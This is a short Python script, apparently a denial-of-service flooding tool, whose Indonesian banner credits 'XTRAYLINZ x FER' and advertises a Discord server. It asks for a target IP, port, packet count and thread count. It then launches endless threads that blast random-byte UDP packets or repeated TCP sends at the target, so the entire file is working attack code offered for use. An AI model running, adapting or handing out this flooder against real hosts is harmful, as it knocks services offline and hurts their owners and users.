#!/usr/bin/env python3
import random
import socket
import threading

print       (" - - > XTRAYLINZ x FER < - - ")
print       (" - - > YANG ABUSE JADI HARAM < - - ")
print       (" - - > DISCORD? •XTraylinz•#0965 dan Ferdi_Pratama#2251  <- - ")                                   
print       (" - - > JIKA BUTUH BANTUAN LEBIH LANJUT BISA PM DISCORD KAMI < - - ")
print       (" - - > JOIN COMMUNITY LINK DIBAWAH < - - ")
print       (" - - > https://discord.gg/5dTjX2Zvun < - - ")
print       (" - - > BUAT YANG MAU BELAJAR LEBIH, JOIN SKUY < - - ")
    
ip = str(input("  Ip:"))
port = int(input(" Port:"))
choice = str(input(" (y/n):"))
times = int(input(" Paket:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" XTRAYLINZ x FER ")
		except:
			print("[!] MAMPUS")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" XTRAYLINZ x FER ")
		except:
			s.close()
			print("[*] MAMPUS")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()